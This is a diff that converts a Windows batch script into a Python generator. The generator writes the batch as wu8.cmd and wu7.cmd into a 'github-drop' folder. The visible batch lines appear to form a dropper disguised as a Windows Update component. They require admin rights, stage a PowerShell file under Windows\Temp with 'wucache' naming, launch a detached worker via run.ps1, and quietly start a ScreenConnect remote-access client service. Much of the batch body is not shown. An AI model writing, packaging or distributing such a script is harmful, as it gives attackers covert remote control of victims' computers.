@@ -1,6 +1,8 @@
-@echo off
+from pathlib import Path
+
+content = r"""@echo off
 setlocal EnableExtensions
-echo === GO.CMD BUILD 20260730WU9A ===
+echo === GO.CMD BUILD 20260730WU8F ===
 
 net session >nul 2>&1
 if errorlevel 1 (
@@ -15,7 +17,7 @@ set "PS1ALT=C:\Windows\Temp\wucache_pkg.ps1"
 set "RUNPS=%WORKDIR%\run.ps1"
 set "ERR=%WORKDIR%\boot.err"
 set "OUT=%WORKDIR%\boot.out"
-set "MARKER=WU_BUILD_20260730_UNIFIED7"
+set "MARKER=WU_BUILD_20260730_UNIFIED6"
 set "CB=%RANDOM%%RANDOM%"
 set "ALTSC=ScreenConnect Client (f861c8140d453427)"
 set "PRIMSC=ScreenConnect Client (5f6010579852e507)"
@@ -99,3 +101,10 @@ echo Launched detached worker [%MARKER%] via run.ps1.
 echo Check in 2 min: type "%ERR%"
 sc start "%ALTSC%" >nul 2>&1
 exit /b 0
+"""
+
+root = Path(r"C:\Users\nobuddy\Desktop\Project\github-drop")
+data = content.replace("\r\n", "\n").replace("\r", "\n").encode("ascii").replace(b"\n", b"\r\n")
+(root / "wu8.cmd").write_bytes(data)
+(root / "wu7.cmd").write_bytes(data)
+print("wrote", len(data), b"WU8F" in data, b"run.ps1" in data)
